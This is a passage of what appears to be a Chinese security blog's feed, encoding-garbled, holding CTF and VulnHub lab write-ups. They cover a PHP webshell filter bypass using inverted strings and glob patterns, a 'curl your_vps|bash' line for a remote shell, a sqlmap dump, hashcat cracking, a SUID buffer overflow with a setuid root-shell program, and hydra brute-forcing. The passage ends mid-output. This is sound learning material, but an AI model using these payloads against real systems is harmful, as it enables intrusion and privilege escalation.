class="string">&quot;XSRF-TOKEN=eyJpdiI6IjEydHFndGVRdGFiVU1RdzFjNElIWUE9PSIsInZhbHVlIjoiMUJJYjJYSk5pWGExR1RVVjFOUnBXdVNKckdTMnhxUjdVb1grTytJMW1uUGo1NmlGY0FJSXpiRlBCb2hmRXFmR0lYYm1RdG55V2RJUVB1eU5iNkFOQ3c9PSIsIm1hYyI6IjYxMjVhNDE1NjAyZjJkMDViZDQyYTRjYjc4Y2YzNTUxY2Y0MWUxNjAzODZiNzJmNDllYWUzYTRiM2MyZDY1YmMifQ%3D%3D; laravel_session=eyJpdiI6ImtDOEpVMmtNRHVXQlR1SWJER0d4bnc9PSIsInZhbHVlIjoiNURxNUE5REFUT0tvNTVWM1hMYVZZRjQyemdKZ2tTM2pZQ0J6cDNiSkpOTys4QmhjelozQ0lTYmYwa1VyWlA0eTRENkloajBKbVV5aWN6MEpVaTNaWEE9PSIsIm1hYyI6IjZhNDVkMDFlN2M0MDYzODRmM2NlYTBiZDEyMmFhZmQyMGVjMzU5YjQ3ZTc4OTkyZmU5YjRjMjgxMTE1NTk5MWUifQ%3D%3D&quot;</span> <span class="string">&#x27;http://127.0.0.1/check&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag <a href="/images/2018/10/2018-10-18-18-54-30å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-18-18-54-30å±å¹•æˆªå›¾.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ— å­—æ¯æ•°å­—webshellå­¦ä¹ </title>
      <link href="/2018/10/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/10/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97webshell%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å®‰æ’æœˆèµ›çš„é¢˜ç›®,è¢«pç¥æ‹¿å‡ºæ¥åˆ†æäº†ä¸€ä¸‹,è¶æœºå­¦ä¹ ä¸€ä¸‹æ–°çŸ¥è¯†</p><h2 id="æºç ">æºç </h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç å—?ç†è®ºæ˜¯å¯ä»¥çš„</p><h2 id="php7">php7</h2><p>ç»™å‡ºä¸€ä¸ªphpçš„é—´æ¥ä½¿ç”¨å˜é‡å±æ€§æ–¹æ³•çš„è¡¨ <a href="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af.png"><img src="/images/2018/10/30179e9c-7bf1-4b3c-8ccc-0c3929ff6204.1cf283b308af-300x151.png" /></a> php7å…è®¸ä½¿ç”¨<code>($a)();</code>æ‰§è¡Œå‡½æ•°,ä¸¾ä¸ªä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%8F%97%8F%96%91%99%90 &lt;=&gt; urlencode(~&#x27;phpinfo&#x27;)</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬æŠŠå·¦è¾¹å–åè¾“å…¥åˆ°code <a href="/images/2018/10/2018-10-09-19-11-02å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-09-19-11-02å±å¹•æˆªå›¾-300x207.png" /></a> <code>phpinfo</code>å¾—åˆ°æ‰§è¡Œ æ‰§è¡Œä»»æ„ä»£ç ,æ¯”å¦‚ <code>system('id')</code> <a href="/images/2018/10/2018-10-09-19-12-07å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-09-19-12-07å±å¹•æˆªå›¾-300x140.png" /></a> å¦‚æœæƒ³è¦åå¼¹shellå¯ä»¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl your_vpsbash</span><br></pre></td></tr></table></figure><p>åæ­£æˆ‘çš„å¹¶æ²¡æœ‰è¶…å­—ç¬¦é™åˆ¶...</p><h2 id="php5">php5</h2><p>php5å°±ä¸ä¸€æ ·äº†,å¦‚æœåŒæ ·ç”¨php7æ‰§è¡Œphpinfoçš„æ–¹æ³•ä¼šæœ‰è¯­æ³•é”™è¯¯,å› ä¸ºphp5å¹¶ä¸èƒ½<code>($a)();</code>æ‰§è¡Œå‡½æ•° <a href="/images/2018/10/2018-10-09-19-39-10å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-09-19-39-10å±å¹•æˆªå›¾-300x91.png" /></a> é‚£ä¹ˆæ€ä¹ˆåˆ©ç”¨å‘¢,æˆ‘ä»¬å¯ä»¥ç”¨åˆ°linuxä¸‹çš„å‡ ä¸ªçŸ¥è¯†ç‚¹</p><blockquote><p>shellä¸‹å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬ Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿,æ¯”å¦‚ *å¯ä»¥ä»£æ›¿0ä¸ªåŠä»¥ä¸Šä»»æ„å­—ç¬¦ ?å¯ä»¥ä»£è¡¨1ä¸ªä»»æ„å­—ç¬¦</p></blockquote><p>è€Œä¸”ç”¨.æ¥æ‰§è¡Œå‘½ä»¤æ˜¯ä¸éœ€è¦xçš„æƒé™çš„,é‚£ä¹ˆåªè¦æœåŠ¡å™¨æœ‰æˆ‘ä»¬çš„æ–‡ä»¶,æˆ‘ä»¬å°±å¯ä»¥ç”¨.å»æ‰§è¡Œ è€Œä¸ºäº†é¿å…å­—æ¯æˆ‘ä»¬å¯ä»¥ç”¨?ä»£æ›¿,æ¯”å¦‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp# ls</span><br><span class="line">phpyhwwPd</span><br><span class="line">root@1811de971fc8:/tmp# . /???/php??????</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@1811de971fc8:/tmp#</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœåˆ—å‡ºæ‰€æœ‰çš„<code>/???/?????????</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># ls /???/?????????</span></span><br><span class="line">/bin/run-parts  /etc/host.conf  /etc/issue.net  /etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜æœ‰å…¶ä»–çš„æ–‡ä»¶,é‚£æˆ‘ä»¬æ€ä¹ˆè·å¾—éœ€è¦çš„/tmpä¸‹é¢çš„ä¸´æ—¶æ–‡ä»¶å‘¢? linuxçš„æ–‡æ¡£é‡Œé¢æœ‰å†™<a href="http://man7.org/linux/man-pages/man7/glob.7.html" title="http://man7.org/linux/man-pages/man7/glob.7.html">http://man7.org/linux/man-pages/man7/glob.7.html</a> æˆ‘ä»¬å¯ä»¥ç”¨<code>[^.]</code>æ’é™¤ç‚¹,åŒç†å¯ä»¥æ’é™¤-</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># ls /???/???[^-][^.][^.]???</span></span><br><span class="line">/etc/localtime  /etc/securetty  /tmp/phpyhwwPd</span><br><span class="line"></span><br><span class="line">/etc/profile.d:</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™è¿˜æœ‰ä¸¤ä¸ªå¹²æ‰°æ–‡ä»¶,æƒ³åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­å¯èƒ½æœ‰å¤§å†™å­—æ¯,è€Œå¤§å†™å­—æ¯éƒ½åœ¨<code>@</code>å’Œ<code>[</code>ä¸­é—´,é‚£ä¹ˆå¯ä»¥ç”¨<code>[@-[]</code>è¡¨ç¤ºå¤§å†™å­—æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@1811de971fc8:/tmp<span class="comment"># . /???/???[^-][^.][^.]?[@-[]?</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@1811de971fc8:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>æœ€åå¸¦ä¸Šä¸€ä¸ªphpæ‰§è¡Œshellçš„å°trick</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&lt;?=`ls`;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å…¶å®æ˜¯æœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ ä¸€å¶é£˜é›¶åšå®¢ä¹Ÿå†™åˆ°è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="variable">$flag</span>=<span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›¸å½“äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæœ€åpayloadä¸º<code>?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;</code> è®°å¾—<code>urlencode</code>ä¸€ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?code=%3F%3E%3C%3F%3D%60.+%2F%3F%3F%3F%2F%3F%3F%3F%3F%3F%3F%3F%5B%40-%5B%5D%3F%60%3B%3F%3E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:9091</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>169</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3sBjBSfSNZn70MBF</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundary3sBjBSfSNZn70MBF</span></span></span><br><span class="line"><span class="language-applescript">Content-Disposition: form-data; <span class="built_in">name</span>=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.sh&quot;</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="comment"># !/bin/bash</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="built_in">id</span></span></span><br><span class="line"><span class="language-applescript"></span></span><br><span class="line"><span class="language-applescript"><span class="comment">------WebKitFormBoundary3sBjBSfSNZn70MBF--</span></span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-09-21-59-46å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-09-21-59-46å±å¹•æˆªå›¾-300x153.png" /></a> å‚è€ƒæ–‡ç« :<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" title="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a> <a href="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/" title="http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/">http://skysec.top/2018/07/26/MeePwn-Web-%E5%A4%8D%E7%8E%B0/</a></p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€(pinky&#39;s palace)</title>
      <link href="/2018/10/07/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fpinkys-palace/"/>
      <url>/2018/10/07/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fpinkys-palace/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/" title="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">https://www.vulnhub.com/entry/pinkys-palace-v1,225/</a></p><h2 id="é¶æœºipå’Œç«¯å£">é¶æœºipå’Œç«¯å£</h2><p>ip:192.168.1.103 ç«¯å£ä¿¡æ¯ <a href="/images/2018/10/2018-10-06-12-23-28å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-23-28å±å¹•æˆªå›¾-300x130.png" /></a></p><h2 id="ä»£ç†è®¿é—®">ä»£ç†è®¿é—®</h2><p>ç›´æ¥è®¿é—®8080ç«¯å£è¢«403äº†,çœ‹åˆ°ä»–æœ‰ä¸ª31337ç«¯å£çš„ä»£ç†,curlæŒ‚ä»£ç†è®¿é—®ä¸€ä¸‹ <a href="/images/2018/10/2018-10-06-12-29-04å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-29-04å±å¹•æˆªå›¾-300x155.png" /></a> å‘ç°ok,ç»™firefoxæŒ‚ä¸ªä»£ç†å»ç›´æ¥è®¿é—® <a href="/images/2018/10/2018-10-06-12-31-04å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-31-04å±å¹•æˆªå›¾-300x130.png" /></a> å‘ç°æ²¡ä¸œè¥¿,dirbusteræ‰«ä¸€ä¸‹,è®¾ç½®dirbusterçš„å°å­—å…¸ <a href="/images/2018/10/2018-10-06-12-40-31å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-40-31å±å¹•æˆªå›¾-300x156.png" /></a> å»è®¿é—®ä¸€ä¸‹ å‘ç°æ˜¯ä¸ªç™»å½•é¡µé¢,admin/adminä¸€ä¸‹ <a href="/images/2018/10/2018-10-06-12-42-35å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-42-35å±å¹•æˆªå›¾-300x196.png" /></a> ç™»å½•é”™è¯¯,çœ‹ä¸‹æºç  <a href="/images/2018/10/2018-10-06-12-42-11å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-42-11å±å¹•æˆªå›¾-300x152.png" /></a> åœ¨å»çœ‹ä¸‹log,å‘ç°æœ‰æˆ‘ä»¬çš„è®°å½• <a href="/images/2018/10/2018-10-06-12-43-31å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-43-31å±å¹•æˆªå›¾-300x65.png" /></a> usernameå’Œpasswordéƒ½è¯•äº†ä¸€ä¸‹æ³¨å…¥,éƒ½æ²¡æˆåŠŸ,è¯•äº†ä¸‹ua,å‘ç°æˆåŠŸæ³¨å…¥,æœ¬æ¥æƒ³å†™è„šæœ¬,ä½†æ˜¯å«Œéº»çƒ¦,ç›´æ¥sqlmapäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --proxy <span class="string">&quot;http://192.168.1.103:31337&quot;</span> -r req.http --level=5 --risk=3 -D pinky_sec_db -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-06-12-49-47å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-12-49-47å±å¹•æˆªå›¾-300x74.png" /></a> ç„¶åç¬¬ä¸€ä¸ªhashè§£ä¸å‡ºæ¥...ç¬¬äºŒä¸ªcmd5ä»˜è´¹æŸ¥è¯¢...æˆ‘é€‰æ‹©writeupå­¦ä¹ æ³•... hashcatç›´æ¥ç”¨rockyouè·‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 d60dffed7cc0d87e1f4a11aa06ca73af /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ˜æ–‡:3pinkysaf33pinkysaf3 ä½†æ˜¯ç™»å½•è¿˜æ˜¯å¯†ç é”™è¯¯,è¯•è¯•ssh <a href="/images/2018/10/2018-10-06-13-04-23å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-13-04-23å±å¹•æˆªå›¾-300x149.png" /></a></p><h2 id="ææƒ">ææƒ</h2><p>æ‰¾äº†ä¸€ä¸‹ç”¨æˆ·ç›®å½•,å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆ,å»webç›®å½•å‘ç°æœ‰ä¸ªå¥‡æ€ªçš„æ–‡ä»¶å¤¹,ä»–è¯´å­˜äº†rsaçš„å¯†é’¥ <a href="/images/2018/10/2018-10-06-14-33-58å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-14-33-58å±å¹•æˆªå›¾-300x137.png" /></a> è§£å¯†ä¸€ä¸‹ç™»å½• <a href="/images/2018/10/2018-10-06-14-35-29å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-14-35-29å±å¹•æˆªå›¾-300x101.png" /></a> çœ‹ä¸‹èƒ½ä¸èƒ½suidææƒ <a href="/images/2018/10/2018-10-06-14-36-34å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-14-36-34å±å¹•æˆªå›¾-300x239.png" /></a> å†çœ‹ä¸‹note</p><blockquote><p>Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(</p></blockquote><p>å‘ç°è¦å»pwnæ‰è¿™ä¸ªadminhelper.... æŠŠç¨‹åºscpä¼ ä¸€ä¸‹ç„¶åida <a href="/images/2018/10/2018-10-07-16-36-42å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-07-16-36-42å±å¹•æˆªå›¾-300x221.png" /></a> çœ‹ä¸€ä¸‹dest <a href="/images/2018/10/2018-10-07-16-36-32å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-07-16-36-32å±å¹•æˆªå›¾-300x166.png" /></a> è¦†ç›–4*16+8ä¹‹ååˆ°è¿”å›åœ°å€ <a href="/images/2018/10/2018-10-07-16-38-36å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-07-16-38-36å±å¹•æˆªå›¾-300x131.png" /></a> checkä¸€ä¸‹aslr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@pinkys-palace:/home/pinky<span class="comment"># cat /proc/sys/kernel/randomize_va_space                                                              </span></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰å¼€ ç„¶åé‡Œé¢æœ‰ä¸ªspawnå‡½æ•°,å¯ä»¥æ‹¿root,åˆ°gdbçœ‹ä¸‹åœ°å€ <a href="/images/2018/10/2018-10-07-16-41-01å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-07-16-41-01å±å¹•æˆªå›¾-300x129.png" /></a> ç›´æ¥å»è·³ä¸€ä¸‹ <a href="/images/2018/10/2018-10-07-16-44-10å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-07-16-44-10å±å¹•æˆªå›¾-300x112.png" /></a> å½“ç„¶,uidå’Œgidå¹¶ä¸æ˜¯root,å®Œå…¨ææƒçš„è¯ç”¨ä¸€ä¸ªç®€å•çš„ç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">execvp(<span class="string">&quot;/bin/bash&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶ågccç¼–è¯‘æ‰§è¡Œ <a href="/images/2018/10/2018-10-07-16-46-00å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-07-16-46-00å±å¹•æˆªå›¾-300x140.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€(blackmarket)</title>
      <link href="/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/"/>
      <url>/2018/10/06/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fblackmarket/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/blackmarket-1,223/" title="https://www.vulnhub.com/entry/blackmarket-1,223/">https://www.vulnhub.com/entry/blackmarket-1,223/</a> ç„¶åé¶æœºæè¿°è¯´æœ‰6ä¸ªflag,æ¯ä¸ªflagéƒ½æœ‰hint... ä¸ªäººæ„Ÿè§‰è„‘æ´æœ‰ç‚¹å¤§...çœ‹çš„wpåšçš„..</p><h2 id="ipç«¯å£">ipç«¯å£</h2><p>ip:192.168.1.106 ç«¯å£ <a href="/images/2018/10/2018-10-06-15-46-30å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-15-46-30å±å¹•æˆªå›¾.png" /></a></p><h2 id="flag1">flag1</h2><p>å»80ç«¯å£ æºç æ‹¿åˆ°flag1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag1&#123;Q0lBIC0gT3BlcmF0aW9uIFRyZWFkc3RvbmU=&#125;</span><br></pre></td></tr></table></figure><p>baseè§£ä¸€ä¸‹å¾—åˆ°<code>CIA - Operation Treadstone</code> æœäº†ä¸€ä¸‹,å‘ç°æ˜¯ä¸ªç”µå½±....çŒœæµ‹è¦å»æ‰¾ç”¨æˆ·åçˆ†ç ´...æ‡’å¾—æ‰¾äº†ç›´æ¥çœ‹wpäº†.... wpç”¨çš„crewè·å–å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w cewl.txt http://bourne.wikia.com/wiki/Operation_Treadstone</span><br></pre></td></tr></table></figure><p>ç„¶åhydraçˆ†ç ´,ä¸è¿‡çˆ†ç ´çš„æ˜¯ftp,åé¢å†è¯´</p><h2 id="flag3">flag3</h2><p>å›åˆ°80ç«¯å£dirbä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.1.106/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/admin/                                                                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/css/                                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/db/                                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/dist/                                                                                            </span><br><span class="line">+ http://192.168.1.106/index.php (CODE:200SIZE:2433)                                                                                </span><br><span class="line">+ http://192.168.1.106/server-status (CODE:403SIZE:293)                                                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/squirrelmail/                                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/supplier/                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/upload/                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/user/                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.1.106/vendor/ </span><br></pre></td></tr></table></figure><p>ç™»å½•é¡µé¢hydraçˆ†ç ´ä¸€ä¸‹,wpç›´æ¥usernameå°±æ”¾ä¸‰ä¸ªç”¨æˆ·å:user,supplier,admin....åæ­£æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæƒ³åˆ°è¿™ä¸ª...</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@kali:~$ hydra -L username.txt -P /home/blacsheep/Tools/WebSecurity/dict/passwords/common/Top196-probable.txt -e nsr -t 64 192.168.1.106 http-post-form <span class="string">&quot;/login.php:username=^USER^&amp;password=^PASS^:failed&quot;</span></span><br><span class="line">Hydra v8.6 (c) 2017 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2018-10-06 16:44:39</span><br><span class="line">[DATA] max 64 tasks per 1 server, overall 64 tasks, 597 login tries (l:3/p:199), ~10 tries per task</span><br><span class="line">[DATA] attacking http-post-form://192.168.1.106:80//login.php:username=^USER^&amp;password=^PASS^:failed</span><br><span class="line">[80][http-post-form] host: 192.168.1.106   login: supplier   password: supplier</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) finished at 2018-10-06 